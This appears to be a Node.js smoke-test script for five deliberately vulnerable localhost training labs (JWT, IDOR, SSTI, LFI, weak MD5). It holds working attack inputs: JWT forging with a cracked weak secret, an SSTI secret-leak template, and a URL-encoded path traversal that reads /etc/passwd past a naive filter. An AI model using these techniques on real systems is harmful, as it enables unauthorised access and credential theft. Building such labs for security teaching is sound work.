// 5 个新靶机的功能冒烟：本地起 Node 跑（无需 Docker），逐一打"故意脆弱"的端点，验证演示效果真实存在
const { spawn } = require('child_process');
const crypto = require('crypto');
const path = require('path');

const NODE = process.execPath;
const ROOT = path.join(__dirname, '..', 'images');

function b64u(b) { return Buffer.from(b).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
function forgeJwt(payload, secret) {
  const h = b64u(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const p = b64u(JSON.stringify(payload));
  const s = b64u(crypto.createHmac('sha256', secret).update(h + '.' + p).digest());
  return h + '.' + p + '.' + s;
}

function httpGet(url) {
  return new Promise((resolve) => {
    const mod = url.startsWith('https') ? require('https') : require('http');
    mod.get(url, (res) => {
      let d = '';
      res.on('data', (c) => { d += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    }).on('error', (e) => resolve({ status: 0, body: String(e.message) }));
  });
}
function httpPost(url, form) {
  return new Promise((resolve) => {
    const body = new URLSearchParams(form).toString();
    const u = new URL(url);
    const req = require('http').request({
      hostname: u.hostname, port: u.port, path: u.pathname, method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let d = '';
      res.on('data', (c) => { d += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e.message) }));
    req.write(body); req.end();
  });
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const CASES = [
  { lab: 'jwt', port: 3011, name: 'JWT 弱密钥' },
  { lab: 'idor', port: 3012, name: 'IDOR 越权' },
  { lab: 'ssti', port: 3013, name: 'SSTI 模板注入' },
  { lab: 'lfi', port: 3014, name: 'LFI 目录穿越' },
  { lab: 'weakpass', port: 3015, name: '弱口令 MD5' },
];

let pass = 0, fail = 0;
function assert(c, m) { if (c) { pass++; console.log('  ✓ ' + m); } else { fail++; console.log('  ✗ ' + m); } }

(async () => {
  const procs = [];
  for (const c of CASES) {
    const p = spawn(NODE, ['app.js'], { cwd: path.join(ROOT, c.lab), env: { ...process.env, PORT: String(c.port) }, stdio: 'ignore' });
    procs.push(p);
  }
  await sleep(1500);

  const base = (c) => 'http://127.0.0.1:' + c.port;
  const C = Object.fromEntries(CASES.map((c) => [c.lab, c]));

  console.log('=== JWT 靶机（:3011）===');
  {
    const home = await httpGet(base(C.jwt) + '/');
    assert(home.status === 200 && home.body.indexOf('JWT 靶机') >= 0, '首页可访问并给出令牌');
    const token = (home.body.match(/([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)/) || [])[1];
    assert(!!token, '页面里带有可复制的 JWT');
    const dec = await httpGet(base(C.jwt) + '/decode?token=' + token);
    assert(dec.body.indexOf('guest') >= 0, '/decode 能读出 payload（演示"JWT 不是加密"）');
    const crack = await httpGet(base(C.jwt) + '/crack?token=' + token);
    assert(crack.body.indexOf('123456') >= 0, '/crack 用弱口令表猜出密钥（演示弱密钥）');
    const forged = forgeJwt({ user: 'guest', role: 'admin' }, '123456');
    const admin = await httpGet(base(C.jwt) + '/admin?token=' + forged);
    assert(admin.status === 200 && admin.body.indexOf('FLAG{') >= 0, '改 role 重新签名后越权成功（拿到 flag）');
    const denied = await httpGet(base(C.jwt) + '/admin?token=' + token);
    assert(denied.status === 403, '未篡改的 guest 令牌被拒（对照）');
  }

  console.log('=== IDOR 靶机（:3012）===');
  {
    const mine = await httpGet(base(C.idor) + '/order?id=1001');
    assert(mine.body.indexOf('这是你的订单') >= 0, '读自己的订单正常');
    const other = await httpGet(base(C.idor) + '/order?id=2001');
    assert(other.body.indexOf('FLAG{') >= 0 && other.body.indexOf('bob') >= 0,
      '改成 2001 能看到别人的订单（越权成功，拿到 flag）');
    assert(other.body.indexOf('****') >= 0, '卡号只显示后四位（演示数据无真实敏感信息）');
  }

  console.log('=== SSTI 靶机（:3013）===');
  {
    const calc = await httpPost(base(C.ssti) + '/', { tpl: '<p>{{7*7}}</p>' });
    assert(calc.body.indexOf('<p>49</p>') >= 0, '{{7*7}} 被服务端当模板求值（演示模板注入）');
    const leak = await httpPost(base(C.ssti) + '/', { tpl: '<p>{{config.secretKey}}</p>' });
    assert(leak.body.indexOf('FLAG{') >= 0, '{{config.secretKey}} 泄露假配置里的 flag');
    const safe = await httpPost(base(C.ssti) + '/', { tpl: '<p>{{process.exit(1)}}</p>' });
    assert(safe.status === 200, '非白名单表达式不会被求值（受限求值器，无任意代码执行）');
  }

  console.log('=== LFI 靶机（:3014）===');
  {
    const plain = await httpGet(base(C.lfi) + '/read?file=public/hello.txt');
    assert(plain.body.indexOf('公开文件') >= 0, '正常读取公开文件');
    const blocked = await httpGet(base(C.lfi) + '/read?file=../etc/passwd');
    assert(blocked.body.indexOf('被拦下了') >= 0, '字面量 ../ 被朴素过滤拦下（对照）');
    const bypass = await httpGet(base(C.lfi) + '/read?file=%2e%2e%2fetc%2fpasswd');
    assert(bypass.body.indexOf('root:x:0:0') >= 0, 'URL 编码绕过成功，读到 etc/passwd（虚拟文件）');
    const flag = await httpGet(base(C.lfi) + '/read?file=flag.txt');
    assert(flag.body.indexOf('FLAG{') >= 0, '直接读 flag.txt（演示任意文件可读）');
  }

  console.log('=== 弱口令靶机（:3015）===');
  {
    const home = await httpGet(base(C.weakpass) + '/');
    assert(home.body.indexOf('MD5') >= 0, '首页展示 MD5 无盐哈希（演示点清晰）');
    const crack = await httpGet(base(C.weakpass) + '/crack?user=alice');
    assert(crack.body.indexOf('123456') >= 0 && crack.body.indexOf('FLAG{') >= 0,
      '30 词字典还原出 alice 的口令（拿到 flag）');
    const cmp = await httpGet(base(C.weakpass) + '/compare');
    assert(cmp.body.indexOf('加盐') >= 0, '提供"加盐 + 慢哈希"对照演示');
  }

  procs.forEach((p) => { try { p.kill(); } catch (e) { /* 忽略 */ } });
  console.log('\n靶机冒烟：通过 ' + pass + ' 项，失败 ' + fail + ' 项');
  process.exit(fail ? 1 : 0);
})();
